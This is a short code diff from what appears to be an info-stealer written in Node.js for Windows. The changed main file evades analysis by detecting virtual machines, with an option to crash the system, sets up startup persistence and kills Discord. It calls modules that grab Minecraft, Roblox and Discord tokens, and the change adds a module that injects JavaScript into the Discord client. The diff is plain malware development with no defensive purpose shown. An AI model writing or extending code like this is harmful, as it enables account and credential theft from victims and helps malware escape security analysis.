@@ -10,7 +10,7 @@ spawnSync('explorer', [tempFolder]);
 
 if (os.platform() !== 'win32') process.exit();
 
-if (checkVM() && config.exitIfVm) {
+if (config.vmProtect && checkVM()) {
   if (config.bsodIfVm) {
     killTasks();
   } else {
@@ -18,7 +18,8 @@ if (checkVM() && config.exitIfVm) {
   }
 } else {
   config.addToStartup && require('./functions/startup');
-  config.killDiscord && require('./functions/kill-discord');
+  config.discord.killProcess && require('./functions/kill-discord');
+  config.discord.injectJs && require('./functions/discord-injection');
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
   require('./functions/grab-discord-token');
